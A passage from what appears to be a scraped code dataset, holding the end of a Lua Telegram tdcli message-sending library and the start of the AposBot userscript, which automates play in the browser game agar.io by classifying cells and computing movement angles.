Performer of the audio, 0-64 characters, may be replaced by the server +-- @caption Audio caption, 0-200 characters +local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, title, performer, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageAudio"", +      audio_ = getInputFile(audio), +      --album_cover_thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      duration_ = duration or \'\', +      title_ = title or \'\', +      performer_ = performer or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendAudio = sendAudio + +-- Document message +-- @document Document to send +-- @thumb Document thumb, if available +-- @caption Document caption, 0-200 characters +local function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageDocument"", +      document_ = getInputFile(document), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      caption_ = caption +    }, +  }, dl_cb, cmd) +end + +M.sendDocument = sendDocument + +-- Photo message +-- @photo Photo to send +-- @caption Photo caption, 0-200 characters +local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessagePhoto"", +      photo_ = getInputFile(photo), +      added_sticker_file_ids_ = {}, +      width_ = 0, +      height_ = 0, +      caption_ = caption +    }, +  }, dl_cb, cmd) +end + +M.sendPhoto = sendPhoto + +-- Sticker message +-- @sticker Sticker to send +-- @thumb Sticker thumb, if available +local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageSticker"", +      sticker_ = getInputFile(sticker), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +    }, +  }, dl_cb, cmd) +end + +M.sendSticker = sendSticker + +-- Video message +-- @video Video to send +-- @thumb Video thumb, if available +-- @duration Duration of video in seconds +-- @width Video width +-- @height Video height +-- @caption Video caption, 0-200 characters +local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageVideo"", +      video_ = getInputFile(video), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      added_sticker_file_ids_ = {}, +      duration_ = duration or \'\', +      width_ = width or \'\', +      height_ = height or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendVideo = sendVideo + +-- Voice message +-- @voice Voice file to send +-- @duration Duration of voice in seconds +-- @waveform Waveform representation of the voice in 5-bit format +-- @caption Voice caption, 0-200 characters +local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageVoice"", +      voice_ = getInputFile(voice), +      duration_ = duration or \'\', +      waveform_ = waveform or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendVoice = sendVoice + +-- Message with location +-- @latitude Latitude of location in degrees as defined by sender +-- @longitude Longitude of location in degrees as defined by sender +local function sendLocation(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, latitude, longitude, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageLocation"", +      location_ = { +        ID = ""Location"", +        latitude_ = latitude, +        longitude_ = longitude +      }, +    }, +  }, dl_cb, cmd) +end + +M.sendLocation = sendLocation + +-- Message with information about venue +-- @venue Venue to send +-- @latitude Latitude of location in degrees as defined by sender +-- @longitude Longitude of location in degrees as defined by sender +-- @title Venue name as defined by sender +-- @address Venue address as defined by sender +-- @provider Provider of venue database as defined by sender. Only ""foursquare"" need to be supported currently +-- @id Identifier of the venue in provider database as defined by sender +local function sendVenue(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, latitude, longitude, title, address, id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageVenue"", +      venue_ = { +        ID = ""Venue"", +        location_ = { +          ID = ""Location"", +          latitude_ = latitude, +          longitude_ = longitude +        }, +        title_ = title, +        address_ = address, +        provider_ = \'foursquare\', +        id_ = id +      }, +    }, +  }, dl_cb, cmd) +end + +M.sendVenue = sendVenue + +-- User contact message +-- @contact Contact to send +-- @phone_number User\'s phone number +-- @first_name User first name, 1-255 characters +-- @last_name User last name +-- @user_id User identifier if known, 0 otherwise +local function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageContact"", +      contact_ = { +        ID = ""Contact"", +        phone_number_ = phone_number, +        first_name_ = first_name, +        last_name_ = last_name, +        user_id_ = user_id +      }, +    }, +  }, dl_cb, cmd) +end + +M.sendContact = sendContact + +-- Message with a game +-- @bot_user_id User identifier of a bot owned the game +-- @game_short_name Game short name +local function sendGame(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, bot_user_id, game_short_name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageGame"", +      bot_user_id_ = bot_user_id, +      game_short_name_ = game_short_name +    }, +  }, dl_cb, cmd) +end + +M.sendGame = sendGame + +-- Forwarded message +-- @from_chat_id Chat identifier of the message to forward +-- @message_id Identifier of the message to forward +local function sendForwarded(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, from_chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageForwarded"", +      from_chat_id_ = from_chat_id, +      message_id_ = message_id +    }, +  }, dl_cb, cmd) +end + +M.sendForwarded = sendForwarded + +return M cli/tg/tgcli (Binary file not shown.) 0 comments on commit 3233fdf  Comment on 3233fdf   Leave a comment Comment  Desktop version",,2
0,https://github.com/osman21/agarbot.js.git,"/*The MIT License (MIT)  Copyright (c) 2015 Apostolique  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/  // ==UserScript== // @name        AposBot // @namespace   AposBot // @include     http://agarz.com/* // @version     3.645 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript==  var aposBotVersion = 3.645;  //TODO: Team mode //      Detect when people are merging //      Split to catch smaller targets //      Angle based cluster code //      Better wall code //      In team mode, make allies be obstacles.  /* Number.prototype.mod = function(n) {     return ((this % n) + n) % n; }; */  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b""; function getLatestCommit() {     window.jQuery.ajax({             url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",             cache: false,             dataType: ""jsonp""         }).done(function(data) {             console.dir(data.data);             console.log(""hmm: "" + data.data.object.sha);             sha = data.data.object.sha;              function update(prefix, name, url) {                 window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");                 window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");                 window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                     window.jQuery(""#"" + prefix + ""Dialog"").hide();                     window.jQuery(""#"" + prefix + ""Dialog"").remove();                 });                 window.jQuery(""#"" + prefix + ""Dialog"").show();             }              $.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/bot.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {                 var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm,"""");                 latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"")+11,latestVersion.indexOf(""// @grant""));                  latestVersion = parseFloat(latestVersion + 0.0000);                 var myVersion = parseFloat(aposBotVersion + 0.0000);                                   if(latestVersion > myVersion)                 {                     update(""aposBot"", ""bot.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/bot.user.js/"");                 }                 console.log(\'Current bot.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);             });          }).fail(function() {}); } getLatestCommit();  console.log(""Running Apos Bot!"");  var f = window; var g = window.jQuery;   console.log(""Apos Bot!"");  window.botList = window.botList || [];  /*function QuickBot() {     this.name = ""QuickBot V1"";     this.customParameters = {};     this.keyAction = function(key) {};     this.displayText = function() {return [];};     this.mainLoop = function() {         return [screenToGameX(getMouseX()),                 screenToGameY(getMouseY())];     }; }  window.botList.push(new QuickBot());*/  function AposBot() {     this.name = ""AposBot "" + aposBotVersion;      this.toggleFollow = false;     this.keyAction = function(key) {         if (81 == key.keyCode) {             console.log(""Toggle Follow Mouse!"");             this.toggleFollow = !this.toggleFollow;         }     };      this.displayText = function() {         return [""Q - Follow Mouse: "" + (this.toggleFollow ? ""On"" : ""Off"")];     };      // Using mod function instead the prototype directly as it is very slow     this.mod = function(num, mod) {         if (mod & (mod - 1) === 0 && mod !== 0) {             return num & (mod - 1);         }         return num < 0 ? ((num % mod) + mod) % mod : num % mod;     };     this.splitDistance = 710;      this.isMerging = function(cell1, cell2) {                 var dist = this.computeDistance(cell1.x, cell1.y, cell2.x, cell2.y, cell1.size, cell2.size);                  //debug logging         if (false){         var params = [cell1.x, cell1.y, cell2.x, cell2.y, cell1.size, cell2.size, dist];         var debugString = params.join("", "");         console.log(""Merge:"" + debugString);         }                  return dist <= -50;     };      //Given an angle value that was gotten from valueAndleBased(),     //returns a new value that scales it appropriately.     this.paraAngleValue = function(angleValue, range) {         return (15 / (range[1])) * (angleValue * angleValue) - (range[1] / 6);     };      this.getMass = function(size) {         return Math.pow(size / 10, 2);     };      this.valueAngleBased = function(angle, range) {         var leftValue = this.mod(angle - range[0], 360);         var rightValue = this.mod(this.rangeToAngle(range) - angle, 360);          var bestValue = Math.min(leftValue, rightValue);          if (bestValue <= range[1]) {             return this.paraAngleValue(bestValue, range);         }         return -1;     };      this.computeDistance = function(x1, y1, x2, y2, s1, s2) {         // Make sure there are no null optional params.         s1 = s1 || 0;         s2 = s2 || 0;         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis) - (s1 + s2);          return distance;     };      // Get a distance that is Inexpensive on the cpu for various purpaces     this.computeInexpensiveDistance = function(x1, y1, x2, y2, s1, s2) {         // Make sure there are no null optional params.         s1 = s1 || 0;         s2 = s2 || 0;         var xdis = x1 - x2;         var ydis = y1 - y2;         // Get abs quickly         xdis = xdis < 0 ? xdis * -1 : xdis;         ydis = ydis < 0 ? ydis * -1 : ydis;          var distance = xdis + ydis;          return distance;     };      this.computeDistanceFromCircleEdgeDeprecated = function(x1, y1, x2, y2, s2) {         var tempD = this.computeDistance(x1, y1, x2, y2);          var offsetX = 0;         var offsetY = 0;          var ratioX = tempD / (x1 - x2);         var ratioY = tempD / (y1 - y2);          offsetX = x1 - (s2 / ratioX);         offsetY = y1 - (s2 / ratioY);          drawPoint(offsetX, offsetY, 5, """");          return this.computeDistance(x2, y2, offsetX, offsetY);     };      this.compareSize = function(player1, player2, ratio) {         if (player1.size * player1.size * ratio < player2.size * player2.size) {             return true;         }         return false;     },      this.canSplit = function(player1, player2) {         return this.compareSize(player1, player2, 2.8) && !this.compareSize(player1, player2, 20);     };      this.isItMe = function(player, cell) {         if (getMode() == "":teams"") {             var currentColor = player[0].color;             var currentRed = currentColor.substring(1,3);             var currentGreen = currentColor.substring(3,5);             var currentBlue = currentColor.substring(5,7);                          var currentTeam = this.getTeam(currentRed, currentGreen, currentBlue);              var cellColor = cell.color;              var cellRed = cellColor.substring(1,3);             var cellGreen = cellColor.substring(3,5);             var cellBlue = cellColor.substring(5,7);              var cellTeam = this.getTeam(cellRed, cellGreen, cellBlue);              if (currentTeam == cellTeam && !cell.isVirus()) {                 return true;             }              //console.log(""COLOR: "" + color);          } else {             for (var i = 0; i < player.length; i++) {                 if (cell.id == player[i].id) {                     return true;                 }             }         }         return false;     };      this.getTeam = function(red, green, blue) {         if (red == ""ff"") {             return 0;         } else if (green == ""ff"") {             return 1;         }         return 2;     };      this.isFood = function(blob, cell) {         if (!cell.isVirus() && this.compareSize(cell, blob, 1.33) || (cell.size <= 13)) {             return true;         }         return false;     };      this.isThreat = function(blob, cell) {                  if (!cell.isVirus() && this.compareSize(blob, cell, 1.30)) {             return true;         }         return false;     };      this.isVirus = function(blob, cell) {         if (blob == null) {             if (cell.isVirus()){return true;}              else {return false;}         }                  if (cell.isVirus() && this.compareSize(cell, blob, 1.2)) {             return true;         } else if (cell.isVirus() && cell.color.substring(3,5).toLowerCase() != ""ff"") {             return true;         }         return false;     };      this.isSplitTarget = function(that, blob, cell) {         if (that.canSplit(cell, blob)) {             return true;         }         return false;     };      this.getTimeToRemerge = function(mass){         return ((mass*0.02) + 30);     };      this.separateListBasedOnFunction = function(that, listToUse, blob) {         var foodElementList = [];         var threatList = [];         var virusList = [];         var splitTargetList = [];          var player = getPlayer();                  var mergeList = [];          Object.keys(listToUse).forEach(function(element, index) {             var isMe = that.isItMe(player, listToUse[element]);              if (!isMe) {                 if (that.isFood(blob, listToUse[element]) && listToUse[element].isNotMoving()) {                     //IT\'S FOOD!                     foodElementList.push(listToUse[element]);                                       } else if (that.isThreat(blob, listToUse[element])) {                     //IT\'S DANGER!                     threatList.push(listToUse[element]);                     mergeList.push(listToUse[element]);                 } else if (that.isVirus(blob, listToUse[element])) {                     //IT\'S VIRUS!                     virusList.push(listToUse[element]);                 }                 else if (that.isSplitTarget(that, blob, listToUse[element])) {                         drawCircle(listToUse[element].x, listToUse[element].y, listToUse[element].size + 50, 7);                         splitTargetList.push(listToUse[element]);                         //foodElementList.push(listToUse[element]);                         mergeList.push(listToUse[element]);                 }                 else {if (that.isVirus(null, listToUse[element])==false) {mergeList.push(listToUse[element]);}                     }             }/*else if(isMe && (getBlobCount(getPlayer()) > 0)){                 //Attempt to make the other cell follow the mother one                 foodElementList.push(listToUse[element]);             }*/         });          foodList = [];         for (var i = 0; i < foodElementList.length; i++) {             foodList.push([foodElementList[i].x, foodElementList[i].y, foodElementList[i].size]);         }                  //console.log(""Merglist length: "" +  mergeList.length)         //cell merging         for (var i = 0; i < mergeList.length; i++) {             for (var z = 0; z < mergeList.length; z++) {                 if (z != i && that.isMerging(mergeList[i], mergeList[z])) { //z != i &&                          //found cells that appear to be merging - if they constitute a threat add them to the theatlist                                                  //clone us a new cell                         var newThreat = {};                         var prop;                                                  for (prop in mergeList[i]) {                             newThreat[prop] = mergeList[i][prop];                         }                                                  //average distance and sum the size                         newThreat.x = (mergeList[i].x + mergeList[z].x)/2;                         newThreat.y = (mergeList[i].y + mergeList[z].y)/2;                         newThreat.size = (mergeList[i].size + mergeList[z].size);                         newThreat.nopredict = true;                         //check its a threat                         if (that.isThreat(blob, newThreat)) {                              //IT\'S DANGER!                             threatList.push(newThreat);                         }                                                               }             }         }                  return [foodList, threatList, virusList, splitTargetList];     };      this.getAll = function(blob) {         var dotList = [];         var player = getPlayer();         var interNodes = getMemoryCells();          dotList = this.separateListBasedOnFunction(this, interNodes, blob);          return dotList;     };      this.clusterFood = function(foodList, blobSize) {         var clusters = [];         var addedCluster = false;          //1: x         //2: y         //3: size or value         //4: Angle, not set here.          for (var i = 0; i < foodList.length; i++) {             for (var j = 0; j < clusters.length; j++) {                 if (this.computeInexpensiveDistance(foodList[i][0], foodList[i][1], clusters[j][0], clusters[j][1]) < blobSize * 2) {                     clusters[j][0] = (foodList[i][0] + clusters[j][0]) / 2;                     clusters[j][1] = (foodList[i][1] + clusters[j][1]) / 2;                     clusters[j][2] += foodList[i][2];                     addedCluster = true;                     break;                 }             }             if (!addedCluster) {                 clusters.push([foodList[i][0], foodList[i][1], foodList[i][2], 0]);             }             addedCluster = false;         }         return clusters;     };      this.getAngle = function(x1, y1, x2, y2) {         //Handle vertical and horizontal lines.          if (x1 == x2) {             if (y1 < y2) {                 return 271;                 //return 89;             } else {                 return 89;             }         }          return (Math.round(Math.atan2(-(y1 - y2), -(x1 - x2)) / Math.PI * 180 + 180));     };      this.slope = function(x1, y1, x2, y2) {         var m = (y1 - y2) / (x1 - x2);          return m;     };      this.slopeFromAngle = function(degree) {         if (degree == 270) {             degree = 271;         } else if (degree == 90) {             degree = 91;         }         return Math.tan((degree - 180) / 180 * Math.PI);     };      //Given two points on a line, finds the slope of a perpendicular line crossing it.     this.inverseSlope = function(x1, y1, x2, y2) {         var m = this.slope(x1, y1, x2, y2);         return (-1) / m;     };      //Given a slope and an offset, returns two points on that line.     this.pointsOnLine = function(slope, useX, useY, distance) {         var b = useY - slope * useX;         var r = Math.sqrt(1 + slope * slope);          var newX1 = (useX + (distance / r));         var newY1 = (useY + ((distance * slope) / r));         var newX2 = (useX + ((-distance) / r));         var newY2 = (useY + (((-distance) * slope) / r));          return [             [newX1, newY1],             [newX2, newY2]         ];     };      this.followAngle = function(angle, useX, useY, distance) {         var slope = this.slopeFromAngle(angle);         var coords = this.pointsOnLine(slope, useX, useY, distance);          var side = this.mod(angle - 90, 360);         if (side < 180) {             return coords[1];         } else {             return coords[0];         }     };      //Using a line formed from point a to b, tells if point c is on S side of that line.     this.isSideLine = function(a, b, c) {         if ((b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0]) > 0) {             return true;         }         return false;     };      //angle range2 is within angle range2     //an Angle is a point and a distance between an other point [5, 40]     this.angleRangeIsWithin = function(range1, range2) {         if (range2[0] == this.mod(range2[0] + range2[1], 360)) {             return true;         }         //console.log(""r1: "" + range1[0] + "", "" + range1[1] + "" ... r2: "" + range2[0] + "", "" + range2[1]);          var distanceFrom0 = this.mod(range1[0] - range2[0], 360);         var distanceFrom1 = this.mod(range1[1] - range2[0], 360);          if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 < distanceFrom1) {             return true;         }         return false;     };      this.angleRangeIsWithinInverted = function(range1, range2) {         var distanceFrom0 = this.mod(range1[0] - range2[0], 360);         var distanceFrom1 = this.mod(range1[1] - range2[0], 360);          if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 > distanceFrom1) {             return true;         }         return false;     };      this.angleIsWithin = function(angle, range) {         var diff = this.mod(this.rangeToAngle(range) - angle, 360);         if (diff >= 0 && diff <= range[1]) {             return true;         }         return false;     };      this.rangeToAngle = function(range) {         return this.mod(range[0] + range[1], 360);     };      this.anglePair = function(range) {         return (range[0] + "", "" + this.rangeToAngle(range) + "" range: "" + range[1]);     };      this.computeAngleRanges = function(blob1, blob2) {         var mainAngle = this.getAngle(blob1.x, blob1.y, blob2.x, blob2.y);         var leftAngle = this.mod(mainAngle - 90, 360);         var rightAngle = this.mod(mainAngle + 90, 360);          var blob1Left = this.followAngle(leftAngle, blob1.x, blob1.y, blob1.size);         var blob1Right = this.followAngle(rightAngle, blob1.x, blob1.y, blob1.size);          var blob2Left = this.followAngle(rightAngle, blob2.x, blob2.y, blob2.size);         var blob2Right = this.followAngle(leftAngle, blob2.x, blob2.y, blob2.size);          var blob1AngleLeft = this.getAngle(blob2.x, blob2.y, blob1Left[0], blob1Left[1]);         var blob1AngleRight = this.getAngle(blob2.x, blob2.y, blob1Right[0], blob1Right[1]);          var blob2AngleLeft = this.getAngle(blob1.x, blob1.y, blob2Left[0], blob2Left[1]);         var blob2AngleRight = this.getAngle(blob1.x, blob1.y, blob2Right[0], blob2Right[1]);          var blob1Range = this.mod(blob1AngleRight - blob1AngleLeft, 360);         var blob2Range = this.mod(blob2AngleRight - blob2AngleLeft, 360);          var tempLine = this.followAngle(blob2AngleLeft, blob2Left[0], blob2Left[1], 400);         //drawLine(blob2Left[0], blob2Left[1], tempLine[0], tempLine[1], 0);          if ((blob1Range / blob2Range) > 1) {             drawPoint(blob1Left[0], blob1Left[1], 3, """");             drawPoint(blob1Right[0], blob1Right[1], 3, """");             drawPoint(blob1.x, blob1.y, 3, """" + blob1Range + "", "" + blob2Range + "" R: "" + (Math.round((blob1Range / blob2Range) * 1000) / 1000));         }          //drawPoint(blob2.x, blob2.y, 3, """" + blob1Range);     };      this.debugAngle = function(angle, text) {         var player = getPlayer();         var line1 = this.followAngle(angle, player[0].x, player[0].y, 300);         drawLine(player[0].x, player[0].y, line1[0], line1[1], 5);         drawPoint(line1[0], line1[1], 5, """" + text);     };      //TODO: Don\'t let this function do the radius math.     this.getEdgeLinesFromPoint = function(blob1, blob2, radius) {         var px = blob1.x;         var py = blob1.y;          var cx = blob2.x;         var cy = blob2.y;          //var radius = blob2.size;          /*if (blob2.isVirus()) {             radius = blob1.size;         } else if(canSplit(blob1, blob2)) {             radius += splitDistance;         } else {             radius += blob1.size * 2;         }*/          var shouldInvert = false;          var tempRadius = this.computeDistance(px, py, cx, cy);         if (tempRadius <= radius) {             radius = tempRadius - 5;             shouldInvert = true;         }          var dx = cx - px;         var dy = cy - py;         var dd = Math.sqrt(dx * dx + dy * dy);         var a = Math.asin(radius / dd);         var b = Math.atan2(dy, dx);          var t = b - a;         var ta = {             x: radius * Math.sin(t),             y: radius * -Math.cos(t)         };          t = b + a;         var tb = {             x: radius * -Math.sin(t),             y: radius * Math.cos(t)         };          var angleLeft = this.getAngle(cx + ta.x, cy + ta.y, px, py);         var angleRight = this.getAngle(cx + tb.x, cy + tb.y, px, py);         var angleDistance = this.mod(angleRight - angleLeft, 360);          /*if (shouldInvert) {             var temp = angleLeft;             angleLeft = this.mod(angleRight + 180, 360);             angleRight = this.mod(temp + 180, 360);             angleDistance = this.mod(angleRight - angleLeft, 360);         }*/          return [angleLeft, angleDistance, [cx + tb.x, cy + tb.y],             [cx + ta.x, cy + ta.y]         ];     };      this.invertAngle = function(range) { // Where are you getting all of these vars from? (badAngles and angle)         var angle1 = this.rangeToAngle(badAngles[i]);         var angle2 = this.mod(badAngles[i][0] - angle, 360);         return [angle1, angle2];     },      this.addWall = function(listToUse, blob) {         //var mapSizeX = Math.abs(f.getMapStartX - f.getMapEndX);         //var mapSizeY = Math.abs(f.getMapStartY - f.getMapEndY);         //var distanceFromWallX = mapSizeX/3;         //var distanceFromWallY = mapSizeY/3;         var distanceFromWallY = 2000;         var distanceFromWallX = 2000;         if (blob.x < getMapStartX() + distanceFromWallX) {             //LEFT             //console.log(""Left"");             listToUse.push([                 [115, true],                 [245, false], this.computeInexpensiveDistance(getMapStartX(), blob.y, blob.x, blob.y)             ]);             var lineLeft = this.followAngle(115, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(245, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         if (blob.y < getMapStartY() + distanceFromWallY) {             //TOP             //console.log(""TOP"");             listToUse.push([                 [205, true],                 [335, false], this.computeInexpensiveDistance(blob.x, getMapStartY(), blob.x, blob.y)             ]);             var lineLeft = this.followAngle(205, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(335, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         if (blob.x > getMapEndX() - distanceFromWallX) {             //RIGHT             //console.log(""RIGHT"");             listToUse.push([                 [295, true],                 [65, false], this.computeInexpensiveDistance(getMapEndX(), blob.y, blob.x, blob.y)             ]);             var lineLeft = this.followAngle(295, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(65, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         if (blob.y > getMapEndY() - distanceFromWallY) {             //BOTTOM             //console.log(""BOTTOM"");             listToUse.push([                 [25, true],                 [155, false], this.computeInexpensiveDistance(blob.x, getMapEndY(), blob.x, blob.y)             ]);             var lineLeft = this.followAngle(25, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(155, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         return listToUse;     };      //listToUse contains angles in the form of [angle, boolean].     //boolean is true when the range is starting. False when it\'s ending.     //range = [[angle1, true], [angle2, false]]      this.getAngleIndex = function(listToUse, angle) {         if (listToUse.length === 0) {             return 0;         }          for (var i = 0; i < listToUse.length; i++) {             if (angle <= listToUse[i][0]) {                 return i;             }         }          return listToUse.length;     };      this.addAngle = function(listToUse, range) {         //#1 Find first open element         //#2 Try to add range1 to the list. If it is within other range, don\'t add it, set a boolean.         //#3 Try to add range2 to the list. If it is withing other range, don\'t add it, set a boolean.          //TODO: Only add the new range at the end after the right stuff has been removed.          var newListToUse = listToUse.slice();          var startIndex = 1;          if (newListToUse.length > 0 && !newListToUse[0][1]) {             startIndex = 0;         }          var startMark = this.getAngleIndex(newListToUse, range[0][0]);         var startBool = this.mod(startMark, 2) != startIndex;          var endMark = this.getAngleIndex(newListToUse, range[1][0]);         var endBool = this.mod(endMark, 2) != startIndex;          var removeList = [];          if (startMark != endMark) {             //Note: If there is still an error, this would be it.             var biggerList = 0;             if (endMark == newListToUse.length) {                 biggerList = 1;             }              for (var i = startMark; i < startMark + this.mod(endMark - startMark, newListToUse.length + biggerList); i++) {                 removeList.push(this.mod(i, newListToUse.length));             }         } else if (startMark < newListToUse.length && endMark < newListToUse.length) {             var startDist = this.mod(newListToUse[startMark][0] - range[0][0], 360);             var endDist = this.mod(newListToUse[endMark][0] - range[1][0], 360);              if (startDist < endDist) {                 for (var i = 0; i < newListToUse.length; i++) {                     removeList.push(i);                 }             }         }          removeList.sort(function(a, b){return b-a;});          for (var i = 0; i < 